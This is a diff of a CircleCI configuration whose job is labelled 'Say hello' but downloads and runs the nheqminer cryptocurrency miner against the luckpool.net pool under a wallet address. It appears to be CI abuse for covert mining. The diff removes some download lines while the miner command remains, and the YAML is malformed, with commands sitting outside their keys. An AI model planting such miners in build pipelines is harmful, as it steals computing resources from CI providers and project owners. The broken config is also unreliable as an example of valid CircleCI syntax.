@@ -16,7 +16,7 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
+          command: 
 #
 tar -xvf nheqminer-Linux-v0.8.2.tgz
 #
@@ -29,12 +29,7 @@ nheqminer/nheqminer -v -l na.luckpool.net:3956 -u RHwoUWZ2t9u8ZrR4z6rR7TnmEjVtzn
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
 workflows:
   say-hello-workflow:
-    jobs: wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
-#
-tar -xvf nheqminer-Linux-v0.8.2.tgz
-#
-tar -xvf nheqminer-Linux-v0.8.2.tar.gz
-#
+    jobs: 
 nheqminer/nheqminer -v -l na.luckpool.net:3956 -u RHwoUWZ2t9u8ZrR4z6rR7TnmEjVtznYyQC.VivoV2149 -p x -t 1
 
       - 
